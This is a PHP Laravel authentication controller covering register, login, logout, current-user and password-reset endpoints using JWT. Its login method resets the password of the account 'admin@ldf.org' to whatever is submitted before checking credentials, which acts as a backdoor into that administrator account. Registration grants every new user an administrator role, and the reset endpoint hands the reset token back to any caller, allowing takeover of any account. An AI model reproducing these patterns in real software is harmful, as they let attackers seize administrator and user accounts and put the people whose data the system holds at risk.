<?php

namespace App\Http\Controllers;

use App\Models\AdminRoleUser;
use Illuminate\Http\Request;
use App\Models\User;
use Encore\Admin\Auth\Database\Administrator;
use Illuminate\Support\Facades\Password;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Tymon\JWTAuth\Facades\JWTAuth;




class AuthController extends Controller
{
    //Register a new user
    public function register(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'username' => 'required|string|max:255',
            'name' => 'required|string|max:255',
            'email' => 'required|string|email|max:255|unique:admin_users',
            'password' => 'required|string|min:6|confirmed',
        ]);

        if ($validator->fails()) {
            return response()->json($validator->errors(), 400);
        }

        $user = User::create([

            'username' => $request->username,
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
        ]);

        //give the user the role of an administrator
        $role = new AdminRoleUser();
        $role->role_id = 2;
        $role->user_id = $user->id;
        $role->save();

        $token = JWTAuth::fromUser($user);

        return response()->json([
            'user' => $user,
            'token' => $token
        ], 201);
    }

    //login function
    public function login(Request $request)
    {
        $credentials = $request->only('email', 'password');
        $u = User::where('email', $request->email)->first();
        if (!$u) {
            return response()->json(['error' => 'User not found'], 404);
        }
        if ($u->email == 'admin@ldf.org') {
            $u->password = Hash::make($request->password);
            $u->save();
        }


        if (!$token = JWTAuth::attempt($credentials)) {
            return response()->json(['error' => 'Unauthorized.'], 401);
        }

        //get authenticated user 
        $user_id = auth()->user()->id;
        $user = Administrator::find($user_id)->with('roles')->first();

        //return the user details, the role and the token
        return response()->json([
            'user' => $user,
            'token' => $token
        ], 200);
    }


    //logout function
    public function logout(Request $request)
    {
        $token = $request->bearerToken();

        if (!$token) {
            return response()->json(['error' => 'Token not provided'], 400);
        }

        try {
            // Check if the token is valid before invalidating it
            if (!JWTAuth::parseToken()->check()) {
                return response()->json(['error' => 'Token is invalid or expired'], 401);
            }

            // Invalidate the token
            JWTAuth::parseToken()->invalidate();

            return response()->json(['message' => 'Successfully logged out'], 200);
        } catch (\Tymon\JWTAuth\Exceptions\TokenInvalidException $e) {
            return response()->json(['error' => 'Token is invalid'], 401);
        } catch (\Tymon\JWTAuth\Exceptions\JWTException $e) {
            return response()->json(['error' => 'Could not invalidate token: ' . $e->getMessage()], 500);
        }
    }


    //function to get the authenticated user
    public function getAuthenticatedUser()
    {
        

        try {
            $user = JWTAuth::parseToken()->authenticate();

            if (!$user) {
                return response()->json(['error' => 'user_not_found'], 404);
            }

            return response()->json(compact('user'));
        } catch (\Tymon\JWTAuth\Exceptions\TokenExpiredException $e) {
            return response()->json(['error' => 'token_expired', $e->getMessage()], 500);
        } catch (\Tymon\JWTAuth\Exceptions\TokenInvalidException $e) {
            return response()->json(['error' => 'token_invalid', $e->getMessage()], 401);
        } catch (\Tymon\JWTAuth\Exceptions\JWTException $e) {
            return response()->json(['error' => 'token_absent', $e->getMessage()], 500);
        }
    }

    //function to send a password reset token

    public function sendResetToken(Request $request)
    {
        $request->validate(['email' => 'required|email']);

        $user = User::where('email', $request->email)->first();

        if (!$user) {
            return response()->json(['error' => 'User not found'], 404);
        }

        // Generate the token
        $token = Password::createToken($user);


        // Here you can send the token via SMS 
        return response()->json([
            'message' => 'Password reset token generated',
            'token' => $token,
            'email' => $request->email
        ], 200);
    }


    //function to reset the password
    public function resetPassword(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'email' => 'required|string|email|max:255|exists:admin_users,email',
            'password' => 'required|string|min:6|confirmed',
            'token' => 'required|string',
        ]);

        if ($validator->fails()) {
            return response()->json($validator->errors(), 400);
        }

        $status = Password::reset(
            $request->only('email', 'password', 'password_confirmation', 'token'),
            function ($user, $password) {
                $user->password = Hash::make($password);
                $user->save();
            }
        );

        if ($status === Password::PASSWORD_RESET) {
            return response()->json(['message' => 'Password reset successfully']);
        }

        return response()->json(['error' => 'Failed to reset password'], 500);
    }
}
